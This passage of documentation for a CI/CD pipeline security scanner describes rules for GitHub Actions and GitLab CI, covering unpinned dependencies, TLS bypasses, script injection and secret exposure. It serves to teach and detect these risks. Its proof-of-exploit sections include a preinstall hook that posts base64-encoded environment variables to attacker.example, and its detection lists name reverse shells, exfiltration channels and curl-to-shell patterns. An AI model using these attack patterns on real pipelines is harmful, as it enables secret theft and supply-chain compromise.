**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-021`](../providers/github.md#gha-021) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-022 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GHA-022`](../providers/github.md#gha-022) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-023 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GHA-023`](../providers/github.md#gha-023) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-024 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves ``who`` published it; a provenance attestation proves ``where/how`` it was built. Consumers can then verify the build happened on a trusted runner, from a specific source commit, with known parameters. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee.

**Recommendation.** Call ``slsa-framework/slsa-github-generator`` or ``actions/attest-build-provenance`` after the build step to emit an in-toto attestation alongside the artifact. ``cosign sign`` alone (covered by GHA-006) signs the artifact but doesn't record *how* it was built. SLSA Build L3 requires the provenance statement.

**Source:** [`GHA-024`](../providers/github.md#gha-024) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-025`: Reusable workflow not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-025 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** A reusable workflow runs with the caller's ``GITHUB_TOKEN`` and secrets by default. If ``uses: org/repo/.github/workflows/release.yml@v1`` resolves to an attacker-modified commit, their code executes with your repository's permissions. This is the same threat model as unpinned step actions (GHA-001) but over a different ``uses:`` surface.

**Recommendation.** Pin every ``jobs.<id>.uses:`` reference to a 40-char commit SHA (``owner/repo/.github/workflows/foo.yml@<sha>``). Tag refs (``@v1``, ``@main``) can be silently repointed by whoever controls the callee repository.

**Source:** [`GHA-025`](../providers/github.md#gha-025) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-026`: Container job disables isolation via `options:` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-026 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** GitHub-hosted runners execute ``container:`` jobs inside a Docker container the runner itself manages, normally a hardened, network-namespaced sandbox. ``options:`` is a free-text passthrough to ``docker run``; a flag that breaks the sandbox (shares host network/PID, runs privileged, maps the Docker socket) turns the job into an RCE on the runner VM.

**Recommendation.** Remove ``--network host``, ``--privileged``, ``--cap-add``, ``--user 0``/``--user root``, ``--pid host``, ``--ipc host``, and host ``-v`` bind-mounts from ``container.options`` and ``services.*.options``. If a build genuinely needs one of these, move it to a dedicated self-hosted pool with branch protection so the flag doesn't reach PR runs.

**Source:** [`GHA-026`](../providers/github.md#gha-026) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-027`: Workflow contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-027 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Distinct from the hygiene checks. GHA-016 flags ``curl | bash`` as a risky default; this rule fires only on concrete indicators, reverse shells, base64-decoded execution, known miner binaries or pool URLs, exfil-channel domains, credential-dump pipes, history-erasure commands. Categories reported: ``obfuscated-exec``, ``reverse-shell``, ``crypto-miner``, ``exfil-channel``, ``credential-exfil``, ``audit-erasure``.

**Recommendation.** Treat this as a potential pipeline compromise. Inspect the matching step(s), identify the author and the PR that introduced them, rotate any credentials the workflow has access to, and audit CloudTrail/AuditLogs for exfil. If the match is a legitimate red-team exercise, whitelist via ``.pipelinecheckignore`` with an ``expires:`` date, never a permanent suppression.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-028`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-028 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** ``eval``, ``sh -c "$X"``, and `` `$X` `` all re-parse the variable's value as shell syntax. If the value contains ``;``, ``&&``, ``|``, backticks, or ``$()``, those metacharacters execute. Even when the variable source looks controlled today, relocating the script or adding a new caller can silently expose it to untrusted input.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec of variables with direct command invocation. If the command really must be dynamic, pass arguments as array members (``"${ARGS[@]}"``) or validate the input against an allow-list before invocation.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool> <literal-args>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd. The rule only fires when the substituted command references a variable.

**Source:** [`GHA-028`](../providers/github.md#gha-028) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-029`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-029 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Package installs that pull from ``git+…`` without a pinned commit, from a local path (``./dir``, ``file:…``, absolute paths), or from a direct tarball URL are invisible to the normal lockfile integrity controls. A moving branch head, a sibling checkout the build assumes exists, or a tarball whose hash isn't verified all give an attacker who controls any of those surfaces the ability to substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GHA-029`](../providers/github.md#gha-029) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-044`: Build tool runs lifecycle scripts on untrusted-trigger workflow <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-044 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Package managers and build tools execute code by design. ``npm install`` runs ``preinstall`` / ``install`` / ``postinstall`` from the PR's ``package.json``; ``pip install .`` runs the PR's ``setup.py``; ``make`` runs the PR's ``Makefile``; ``mvn`` / ``gradle`` load plugins declared in the PR's ``pom.xml`` / ``build.gradle``; ``cargo build`` runs ``build.rs``. Under ``pull_request_target`` / ``workflow_run``, the surrounding context already has secrets and a write-scope token, so the lifecycle hook is the entire attack.

**Recommendation.** Don't run install / build commands under ``pull_request_target`` or ``workflow_run`` against a tree that may be PR-controlled. Split the workflow: keep the privileged work on ``push`` / ``release`` (no fork content), and run untrusted builds in a separate ``pull_request`` workflow with no secrets and a read-only ``GITHUB_TOKEN``. If you must build PR code with secrets, do it inside a container with no network egress and a minimal filesystem, never directly on the runner.

**Known false positives.**

- Workflows that pin the workspace to a trusted ref before invoking the build tool (``actions/checkout`` with no ``ref:`` override on ``pull_request_target``, or a fresh checkout of a default-branch SHA) aren't actually exposed. The rule fires on the build-tool invocation alone; suppress with a ``.pipelinecheckignore`` rationale when the workspace is provably clean.

**Seen in the wild.**

- Trail of Bits ``Public PPE`` write-up (2022): demonstrated the primitive against ``pull_request_target`` workflows that ran ``npm install`` after checking out PR content. The PR-supplied ``preinstall`` script ran with the base repo's secrets in scope. Same shape with ``pip install -e .`` (setup.py) and ``make`` (Makefile).
- Cycode / Legit Security ``Poisoned Pipeline Execution`` research (2022-2023) catalogued dozens of OSS repos where a privileged-trigger workflow's build step executed PR-controlled config: ``setup.py``'s ``cmdclass``, ``build.gradle``'s ``init.gradle``, ``pom.xml``'s ``<build><plugins>``. The fix pattern is always: don't build untrusted code with secrets in scope.

**Proof of exploit.**

# Vulnerable: pull_request_target + npm install.
name: pr-build
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install         # executes package.json scripts

# Attack: PR ships a tampered package.json with:
#
#   "scripts": {
#     "preinstall": "curl -X POST https://attacker.example/x \
#       -d \"$(env | base64 -w0)\""
#   }
#
# ``npm install`` runs ``preinstall`` before resolving any
# dependency, so the exfil fires the moment the workflow
# starts. Same shape with pip install -e . (runs setup.py),
# make (runs Makefile), mvn (runs pom.xml plugins), gradle
# (runs init scripts), cargo build (runs build.rs).

# Safe: split the workflow. Privileged labeler runs on
# pull_request_target with secrets but never installs the
# PR. The build runs on pull_request with no secrets:
name: build
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm install         # no secrets in scope

**Source:** [`GHA-044`](../providers/github.md#gha-044) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-045`: Caller-controlled ref input feeds actions/checkout <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-045 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** ``workflow_dispatch`` / ``workflow_call`` inputs land in ``${{ inputs.<name> }}``. Feeding that directly into the ``ref:`` of ``actions/checkout`` means the caller picks which commit runs in this workflow's privileged context (secrets, ``GITHUB_TOKEN``, environment approvals already satisfied). The callee can't tell whether the ref points at a vetted branch, a private fork's tip, or an attacker-controlled SHA. The rule fires on ``ref:`` values whose expression resolves to an ``inputs.*`` reference, walking any ``${{ ... }}`` expression that names an input field.

**Recommendation.** Validate the ``ref`` input against an allow-list (a regex for ``refs/heads/release-*``, an explicit set of permitted tags, or a 40-char SHA match) BEFORE passing it to ``actions/checkout``. If the workflow only needs to build release tags, hard-code the ref or derive it from ``github.event.release.tag_name`` (still attacker-influenced, but at least scoped to a release event). For reusable workflows, document that the callee assumes callers have already validated the ref, and pin every caller to a known list of refs.

**Known false positives.**

- Reusable workflows that ARE the trust boundary (the callee is documented as the authoritative checkout entrypoint and every caller is internal / pinned by SHA) accept this shape by design. The rule still surfaces these so the author can document the contract in a ``.pipelinecheckignore`` rationale; suppress with the caller-list cite.

**Seen in the wild.**

- Snyk ``GitHub Actions abuse via workflow_dispatch`` research (2023) showed reusable build workflows that accepted a ``ref`` input and checked it out without validation. An attacker with workflow_dispatch permission (commonly granted to broader sets of actors than push) pointed the checkout at a fork SHA and exfiltrated the production deploy credentials.

**Proof of exploit.**

# Vulnerable: caller picks the ref.
name: build-release
on:
  workflow_dispatch:
    inputs:
      ref:
        description: 'Tag or branch to build'
        required: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ inputs.ref }}      # caller controls
      - run: make release
        env:
          SIGNING_KEY: ${{ secrets.RELEASE_SIGNING_KEY }}

# Attack: any actor with workflow_dispatch permission opens
# the API and dispatches with ``ref: refs/pull/123/head`` (a
# fork PR). The privileged workflow checks out the attacker-
# controlled tree and runs ``make release`` with the signing
# key in scope. No code review, no PR merge — one API call.

# Safe: validate the ref before use.
      - name: Validate ref
        run: |
          case "$REF" in
            refs/tags/v*) ;;
            *) echo "refusing $REF"; exit 1 ;;
          esac
        env:
          REF: ${{ inputs.ref }}
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ inputs.ref }}

**Source:** [`GHA-045`](../providers/github.md#gha-045) in the [GitHub Actions provider](../providers/github.md).

#### `GHA-046`: Manual PR-head fetch on untrusted-trigger workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-046 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** GHA-002 catches ``actions/checkout`` with ``ref: ${{ github.event.pull_request.head.sha }}``. The same primitive shows up as ``gh pr checkout``, ``git fetch origin pull/<N>/head``, and ``git checkout`` of an attacker-controlled SHA expression inside a ``run:`` block. They all land the same bytes in the workspace with the same privileged context active, so they get the same severity.

**Recommendation.** Don't materialize the PR head in a ``pull_request_target`` or ``workflow_run`` job. If you need to inspect PR content, split the workflow: a privileged half (with secrets) that uses metadata only (PR number, base ref, label) and an unprivileged ``pull_request`` half that builds the code with no secrets in scope.

**Known false positives.**

- Workflows that fetch the PR head purely to *inspect metadata* (``git fetch origin pull/N/head && git log -1 FETCH_HEAD --format=%s``) and never run code from the fetched tree still trigger the rule, because the fetch primitive is the structural signal. The rule has no way to confirm the workspace bytes are never executed. Suppress per-workflow via ``--ignore-file`` once you've verified no ``run:`` / ``uses: ./`` step consumes the checked-out tree; the safer pattern is still to read PR metadata via the GitHub API rather than materializing the head ref.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020) listed manual ``git fetch pull/<N>/head`` as one of the equivalent ways teams shoot themselves in the foot. Auditors checking only ``actions/checkout`` miss the shell-level variants entirely.

**Proof of exploit.**

# Vulnerable: pull_request_target + gh pr checkout.
name: triage
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  test-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # base, looks safe
      - run: gh pr checkout ${{ github.event.number }}
        env:
          GH_TOKEN: ${{ github.token }}
      - run: make test           # now runs PR Makefile

# Attack: same as GHA-002. The PR ships a Makefile that
# exfils $GITHUB_TOKEN and every ${{ secrets.* }} the
# pull_request_target context exposes. GHA-002's pattern
# match never fires because ``actions/checkout`` looks
# innocent, the PR content lands via the shell instead.

# Safe: don't materialize PR content with secrets active.
# Move the build to a pull_request workflow:
name: build
on: { pull_request: {} }
jobs:
  test-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # PR head, no secrets
      - run: make test

**Source:** [`GHA-046`](../providers/github.md#gha-046) in the [GitHub Actions provider](../providers/github.md).

#### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Floating tags (`latest` or major-only) can be silently swapped under the job. Every `image:` reference should pin a specific version tag or digest.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag (e.g. `python:3.12.1-slim`). Avoid `:latest` and bare tags like `:3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-002`: Script injection via untrusted commit/MR context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-002 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** CI_COMMIT_MESSAGE / CI_COMMIT_REF_NAME / CI_MERGE_REQUEST_TITLE and friends are populated from SCM event metadata the attacker controls. Interpolating them into a shell body executes the crafted content as part of the build.

**Recommendation.** Read these values into intermediate `variables:` entries or shell variables and quote them defensively (`"$BRANCH"`). Never inline `$CI_COMMIT_MESSAGE` / `$CI_MERGE_REQUEST_TITLE` into a shell command.

**Source:** [`GL-002`](../providers/gitlab.md#gl-002) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-003 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Scans `variables:` at the top level and on each job for entries whose KEY looks credential-shaped and whose VALUE is a literal string (not a `$VAR` reference). AWS access keys are detected by value pattern regardless of key name.

**Recommendation.** Store credentials as protected + masked CI/CD variables in project or group settings, and reference them by name from the YAML. For cloud access prefer short-lived OIDC tokens.

**Source:** [`GL-003`](../providers/gitlab.md#gl-003) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-005`: include: pulls remote / project without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-005 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.

**Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.

**Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-006 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Unsigned artifacts can't be verified downstream, so a tampered build is indistinguishable from a legitimate one. Pass when any of cosign / sigstore / slsa-* / notation-sign appears in the pipeline text.

**Recommendation.** Add a job that runs `cosign sign` (keyless OIDC with GitLab's id_tokens works out of the box) or `notation sign`. Publish the signature next to the artifact and verify it on consume.

**Source:** [`GL-006`](../providers/gitlab.md#gl-006) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-007 }

**Evidences:** [`GV.SC-03`](#ctrl-gv-sc-03) Cybersecurity supply chain risk management is integrated into CS and ERM programs, [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / spdx-sbom-generator / sbom-tool / Trivy-SBOM appears in the pipeline body.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or GitLab's built-in CycloneDX dependency-scanning template. Attach the SBOM as a pipeline artifact.

**Source:** [`GL-007`](../providers/gitlab.md#gl-007) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-008 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Complements GL-003 (which looks at `variables:` block keys). GL-008 scans every string in the pipeline against the cross-provider credential-pattern catalog, catches secrets pasted into `script:` bodies or environment blocks where the name-based detector can't see them.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a protected + masked CI/CD variable and reference it by name. For cloud access prefer short-lived OIDC tokens.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`GL-008`](../providers/gitlab.md#gl-008) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-009`: Image pinned to version tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-gl-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** GL-001 fails floating tags at HIGH; GL-009 is the stricter tier. Even immutable-looking version tags (`python:3.12.1`) can be repointed by registry operators. Digest pins are the only tamper-evident form.

**Recommendation.** Resolve each image to its current digest (`docker buildx imagetools inspect <ref>` prints it) and replace the tag with `@sha256:<digest>`. Automate refreshes with Renovate.

**Source:** [`GL-009`](../providers/gitlab.md#gl-009) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-010`: Multi-project pipeline ingests upstream artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-010 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `needs: { project: ..., artifacts: true }` pulls artifacts from another project's pipeline. If that upstream project accepts MR pipelines, the artifact may have been built by attacker-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest signed by the upstream project's release key. Only consume artifacts produced by upstream pipelines whose origin you can trust.

**Source:** [`GL-010`](../providers/gitlab.md#gl-010) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-011`: include: local file pulled in MR-triggered pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-011 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `include: local: '<path>'` resolves from the current pipeline's checked-out tree. On an MR pipeline the tree is the MR source branch, the MR author controls the included YAML content.

**Recommendation.** Move the included template into a separate, read-only project and reference it via `include: project: ... ref: <sha-or-tag>`. That way the included content is fixed at MR creation time and not editable from the MR branch.

**Source:** [`GL-011`](../providers/gitlab.md#gl-011) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-012`: Cache key derives from MR-controlled CI variable <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-012 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** GitLab caches restore by key prefix. When the key includes an MR-controlled variable, an attacker can poison a cache entry that a later default-branch pipeline restores.

**Recommendation.** Build the cache key from values the MR can't control: lockfile contents (`files: [Cargo.lock]`), the job name, and `$CI_PROJECT_NAMESPACE`. Never reference `$CI_MERGE_REQUEST_*` or `$CI_COMMIT_BRANCH` from a cache key namespace.

**Source:** [`GL-012`](../providers/gitlab.md#gl-012) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-013`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-013 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values in CI/CD variables can't be rotated on a fine-grained schedule. GitLab supports OIDC via `id_tokens:` for short-lived credential injection.

**Recommendation.** Use GitLab CI/CD OIDC with `id_tokens:` to obtain short-lived AWS credentials via `sts:AssumeRoleWithWebIdentity`. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from CI/CD variables.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-013`](../providers/gitlab.md#gl-013) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-014`: Self-managed runner without ephemeral tag <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-014 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Self-managed runners that don't tear down between jobs leak filesystem and process state. The check looks for an `ephemeral` tag on any job whose `tags:` list doesn't match SaaS-only runner names.

**Recommendation.** Register the runner with `--executor docker` + `--docker-pull-policy always` so containers are fresh per job, and add an `ephemeral` tag. Alternatively use the GitLab Runner Operator with autoscaling.

**Source:** [`GL-014`](../providers/gitlab.md#gl-014) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-015`: Job has no `timeout`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-015 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without an explicit `timeout`, the job runs until the instance-level default (typically 60 minutes). Explicit timeouts cap blast radius and the window during which a compromised script has access to CI/CD variables.

**Recommendation.** Add `timeout:` to each job (e.g. `timeout: 30 minutes`), sized to the 95th percentile of historical runtime. GitLab's default is 60 minutes (or the instance admin setting).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-015`](../providers/gitlab.md#gl-015) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-016 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`GL-016`](../providers/gitlab.md#gl-016) in the [GitLab CI provider](../providers/gitlab.md).

#### `GL-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-017 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a pipeline give the container full access to the CI runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

